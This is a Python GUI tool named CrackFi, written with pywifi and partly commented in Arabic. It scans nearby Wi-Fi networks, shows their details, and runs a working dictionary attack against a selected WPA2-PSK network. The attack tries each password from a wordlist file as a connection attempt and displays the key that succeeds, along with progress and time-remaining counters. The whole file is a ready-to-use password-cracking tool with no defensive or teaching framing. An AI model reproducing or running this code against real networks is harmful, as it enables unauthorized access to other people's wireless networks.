# Project Name : CrackFi
# Version : 1.0.0v
#------------------------------------------------------------------------------------------------------------

import time
import pywifi
from pywifi import *
from hacklore import *

#------------------------------------------------------------------------------------------------------------

wifiNames = {}
current_running_scan = False
current_scan_worker = None
current_crack_worker = None

def browse():
    select_file = FileDialog()
    select = select_file.openFile(caption='Select Password File Path', filter="Text Files (*.txt)")

    if select:
        passwordPath.setReadOnly(read_only=False)
        passwordPath.setText(select)
        passwordPath.setReadOnly(read_only=True)

def scan_wifi():
    infoLabel.setText('Scanning...')
    listView.Clear()
    myProgress.setValue(0)

    global current_running_scan, current_crack_worker, current_scan_worker
    current_running_scan = True

    def wifi_scanner_logic(progress_callback):
        global current_running_scan, wifiNames

        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]

        while current_running_scan:
            iface.scan()
            time.sleep(2)
            scan_results = iface.scan_results()
            active_bssids_in_this_loop = set()
            
            current_id = len(wifiNames) + 1

            for network in scan_results:
                ssid = network.ssid.strip()
                bssid = network.bssid
                if not ssid: 
                    continue

                active_bssids_in_this_loop.add(bssid)
                already_exists = any(value[1] == bssid for value in wifiNames.values())
                
                if not already_exists:
                    wifiNames[current_id] = [ssid, bssid]
                    current_id += 1
            
            display_wifi_names = []
            for key, value in wifiNames.items():
                if value[1] in active_bssids_in_this_loop:
                    display_wifi_names.append(f"[ {key} ] {value[0]}")

            progress_callback.emit(display_wifi_names)
            time.sleep(2)
        
    def update_wifi_list(display_wifi_names):
        if not display_wifi_names or not isinstance(display_wifi_names, list):
            return

        information.setText('')
        passwordStatue.setText('')

        final_text = "\n".join(display_wifi_names)

        if not final_text:
            final_text = "No networks found yet..."
        
        information.setText(text=final_text)

    current_scan_worker = WorkerThread(wifi_scanner_logic, progress_callback=None)
    current_scan_worker.signals.result.connect(update_wifi_list)
    current_scan_worker.kwargs['progress_callback'] = current_scan_worker.signals.result
    current_scan_worker.start()


def get_actual_ssid(user_input):
    global wifiNames
    user_input = user_input.strip()
    
    if user_input.isdigit():
        for key, value in wifiNames.items():
            if key == int(user_input):
                return value[0]
    return user_input


def get_wifi_information():
    raw_input = wifiName.Get()
    target_ssid = get_actual_ssid(raw_input)

    if not target_ssid:
        message_box = MessageBox(title='CrackFi', text='Please enter a valid network name or ID.', icon='warning')
        message_box.addButton(text='OK', role='accept')
        message_box.exec()
        return
    
    global current_running_scan
    current_running_scan = False

    information.setText('')
    passwordStatue.setText('')
    listView.Clear()
    myProgress.setValue(0)

    listView.add_item(f'Obtaining network information {target_ssid}...')
    infoLabel.setText('SSID Information')

    app.processEvents()

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()

    for _ in range(4):
        time.sleep(0.5)
        app.processEvents()

    scan_results = iface.scan_results()
    network_found = None
    for network in scan_results:
        if network.ssid.strip() == target_ssid:
            network_found = network
            break

    if network_found:
        auth_type = "Unknown"
        if network_found.akm[0] == pywifi.const.AKM_TYPE_NONE:
            auth_type = "Open"
        elif network_found.akm[0] == pywifi.const.AKM_TYPE_WPA:
            auth_type = "WPA"
        elif network_found.akm[0] == pywifi.const.AKM_TYPE_WPAPSK:
            auth_type = "WPA-PSK"
        elif network_found.akm[0] == pywifi.const.AKM_TYPE_WPA2:
            auth_type = "WPA2"
        elif network_found.akm[0] == pywifi.const.AKM_TYPE_WPA2PSK:
            auth_type = "WPA2-PSK"

        info_text = (
            f"• Name: {network_found.ssid}\n\n"
            f"• Mac Address (BSSID): {network_found.bssid.upper()}\n\n"
            f"• Encryption and security type: {auth_type}\n\n"
            f"• Signal strength: {network_found.signal} dBm\n\n\n"
            f"• Network information found successfully."
        )
        information.setText(text=info_text)
    else:
        information.setText(text="• The network was not found.")
        listView.add_item(f'[-] Network {target_ssid} not found. Try again.')


def crack_wifi():
    raw_input = wifiName.Get()
    target_wifi_name = get_actual_ssid(raw_input)
    target_path = passwordPath.Get()

    if not target_wifi_name or not target_path:
        message_box = MessageBox(title='CrackFi', text='Please select SSID (or ID) and Password file first.', icon='warning')
        message_box.addButton(text='OK', role='accept')
        message_box.exec()
        return
    
    global current_running_scan, current_crack_worker
    current_running_scan = False
    
    infoLabel.setText('Cracking... 0.0%')
    information.setText('')
    passwordStatue.setText('')
    listView.Clear()
    myProgress.setValue(0)

    def crack_logic(progress_callback):
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]

        try:
            # 1. حساب إجمالي عدد الكلمات في الملف لمعرفة النسبة بدقة
            total_lines = 0
            with open(target_path, 'r', encoding='utf-8', errors='ignore') as f:
                for _ in f:
                    total_lines += 1
            
            if total_lines == 0:
                total_lines = 1

            start_time = time.time()
            current_line = 0

            with open(target_path, 'r', encoding='utf-8', errors='ignore') as file:
                for password in file:
                    wifi_pass = password.strip()
                    if not wifi_pass: 
                        continue

                    current_line += 1
                    iface.disconnect()
                    
                    profile = pywifi.Profile()
                    profile.ssid = target_wifi_name
                    profile.auth = const.AUTH_ALG_OPEN
                    profile.akm.append(const.AKM_TYPE_WPA2PSK)
                    profile.cipher = const.CIPHER_TYPE_CCMP
                    profile.key = wifi_pass

                    iface.remove_all_network_profiles()
                    temp_profile = iface.add_network_profile(profile)
                    iface.connect(temp_profile)
                    
                    # حساب نسبة التقدم والوقت الحالي المنقضي
                    percentage = (current_line / total_lines) * 100
                    elapsed_time = time.time() - start_time
                    
                    # احتساب الوقت المتبقي تقريبياً بناءً على سرعة الفحص الحالية
                    seconds_per_line = elapsed_time / current_line
                    remaining_lines = total_lines - current_line
                    estimated_seconds_left = int(remaining_lines * seconds_per_line)

                    # إرسال البيانات المحدثة متضمنة النص والوقت المتبقي المنسق وقيمة الشريط
                    progress_callback.emit({
                        "log": f'Trying crack with this password : [ {wifi_pass} ]',
                        "percentage": int(percentage),
                        "time_left": estimated_seconds_left
                    })

                    is_connected = False
                    for _ in range(10):
                        time.sleep(0.5)
                        if iface.status() == const.IFACE_CONNECTED:
                            is_connected = True
                            break
                        elif iface.status() == const.IFACE_DISCONNECTED and _ > 4:
                            break

                    if is_connected:
                        return {"status": "success", "password": wifi_pass}

            return {"status": "failed", "password": None}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def on_crack_progress_received(data):
        # تحديث قائمة الطرفية بالكلمات المجربة
        listView.add_item(data["log"])
        listView.scrollToBottom()
        
        # تحديث شريط التقدم الحقيقي
        myProgress.setValue(data["percentage"])
        
        # تنسيق الوقت المتبقي إلى ثوانٍ، دقائق، أو ساعات
        seconds_left = data["time_left"]
        if seconds_left >= 3600:
            hours = seconds_left // 3600
            minutes = (seconds_left % 3600) // 60
            seconds = seconds_left % 60
            time_str = f"{hours}h {minutes}m {seconds}s"
        elif seconds_left >= 60:
            minutes = seconds_left // 60
            seconds = seconds_left % 60
            time_str = f"{minutes}m {seconds}s"
        else:
            time_str = f"{seconds_left}s"
            
        # تحديث الـ Label العلوي بالشكل المطلوب تماماً مع تماشي النسبة المئوية والعداد الزمني المتبقي
        infoLabel.setText(f'Cracking... {data["percentage"]:.1f}% (Remaining: {time_str})')
        preciseProgress.setText(f'{data["percentage"]:.1f}%')

    def on_crack_finished(result):
        if result["status"] == "success":
            passwordStatue.setText(f"• Connected Successfully.\n• Password: {result['password']}")
            infoLabel.setText('Cracking Finished - Success')

        elif result["status"] == "failed":
            passwordStatue.setText("• Finished: Password not found in the file.")
            infoLabel.setText('Cracking Finished - Failed')
        else:
            passwordStatue.setText(f"• Error encountered: {result['message']}")
            infoLabel.setText('Cracking Error')

    current_crack_worker = WorkerThread(crack_logic, progress_callback=None)
    current_crack_worker.signals.progress.connect(on_crack_progress_received)
    current_crack_worker.signals.result.connect(on_crack_finished)
    current_crack_worker.kwargs['progress_callback'] = current_crack_worker.signals.progress
    current_crack_worker.start()

#------------------------------------------------------------------------------------------------------------

app = App()
app.Style(first_style='''background-color: lightgray;''', second_style='''''')

page = Page()
page.Layout(layout_type='v')
page.Align(alignment='top')
page.Margin(left=10, top=50, right=10, bottom=100)
page.Spacing(25)
app.addPage(page=page, title='CrackFi')

wifinameFrame = Frame()
wifinameFrame.Layout(layout_type='h')
wifinameFrame.Margin(left=0, top=0, right=0, bottom=0)
wifinameFrame.Style(first_style='''''', second_style='''''')
page.Add(wifinameFrame)

wifiName = Entry(placeholder_text='Choose The Network Number')
wifinameFrame.addTo(wifiName)

scanButton = Button(text='Scan', command=lambda: scan_wifi())
wifinameFrame.addTo(scanButton)

getButton = Button(text='Get Information', command=lambda: get_wifi_information())
wifinameFrame.addTo(getButton)

crackButton = Button(text='Crack Wi-Fi', command=lambda: crack_wifi())
wifinameFrame.addTo(crackButton)

passwordFrame = Frame()
passwordFrame.Layout(layout_type='h')
passwordFrame.Margin(left=0, top=0, right=0, bottom=0)
passwordFrame.Style(first_style='''''', second_style='''''')
page.Add(passwordFrame)

passwordPath = Entry(placeholder_text='Select Password File Path')
passwordPath.setReadOnly(read_only=True)
passwordFrame.addTo(passwordPath)

browseButton = Button(text='Browse', command=lambda: browse())
passwordFrame.addTo(browseButton)

boxFrame = Frame()
boxFrame.Layout(layout_type='h')
boxFrame.Margin(left=0, top=0, right=0, bottom=0)
boxFrame.Style(first_style='''''', second_style='''''')
boxFrame.minHeight(min_height=400)
page.Add(boxFrame)

infoFrame = Frame()
infoFrame.Layout(layout_type='v')
infoFrame.Align(alignment='top')
infoFrame.Margin(left=0, top=0, right=0, bottom=0)
infoFrame.Spacing(25)
infoFrame.Style(first_style='''border: 2px solid darkslategrey;''', second_style='''''')
infoFrame.minWidth(min_width=400)
infoFrame.maxWidth(max_width=400)
boxFrame.addTo(infoFrame)

infoLabel = Label(text='Wi-Fi Information')
infoLabel.Style(first_style='''color: darkslategrey; font-family: Lucida Console; font-weight: bold; font-size: 14px; padding-left: 5px; padding-top: 5px; padding-bottom: 2px;''', second_style='''''')
infoFrame.addTo(infoLabel)

information = Label(text='')
information.Style(first_style='''color: darkslategrey; font-family: Lucida Console; font-weight: bold; font-size: 12px; border-top: none; border-bottom: none; padding-left: 5px;''', second_style='''''')
infoFrame.addTo(information)

passwordStatue = Label(text='')
passwordStatue.Style(first_style='''color: darkslategrey; font-family: Lucida Console; font-weight: bold; font-size: 12px; border-top: none; border-bottom: none; padding-left: 5px;''', second_style='''''')
infoFrame.addTo(passwordStatue)

termnalFrame = Frame()
termnalFrame.Layout(layout_type='v')
termnalFrame.Align(alignment='top')
termnalFrame.Margin(left=0, top=0, right=0, bottom=0)
termnalFrame.Style(first_style='''border: 2px solid darkslategrey;''', second_style='''''')
termnalFrame.minWidth(min_width=500)
boxFrame.addTo(termnalFrame)

termnalLabel = Label(text='Terminal Output')
termnalLabel.Style(first_style='''color: darkslategrey; font-family: Lucida Console; font-weight: bold; font-size: 14px; padding-left: 5px; padding-top: 5px; padding-bottom: 2px;''', second_style='''''')
termnalFrame.addTo(termnalLabel)

listView = ListView()
listView.Style(first_style='''color: darkslategrey; font-family: Lucida Console; font-weight: bold; font-size: 14px; border-top: none; outline: none; padding-right: 5px; padding-bottom: 8px;''')
listView.Spacing(5)
listView.scrollToBottom()
termnalFrame.addTo(listView)


progressFrame = Frame()
progressFrame.Layout(layout_type='h')
progressFrame.Align(alignment='center')
progressFrame.Margin(left=0, top=0, right=0, bottom=0)
progressFrame.Style(first_style='''''', second_style='''''')
page.Add(progressFrame)



myProgress = ProgressBar(minimum=0, maximum=100)
myProgress.setTextVisible(False)
myProgress.maxHeight(8)
myProgress.Style(first_style="""border: none; background-color: #E0E0E0; border-radius: 4px;""", second_style="""chunk { background-color: darkslategrey; border-radius: 4px;}""")
progressFrame.addTo(myProgress)


preciseProgress = Label(text='0%')
preciseProgress.Style(first_style='''color: darkslategrey; font-family: Lucida Console; font-weight: bold; font-size: 18px; padding-right: 10px;''', second_style='''''')
progressFrame.addTo(preciseProgress)

app.Mainloop()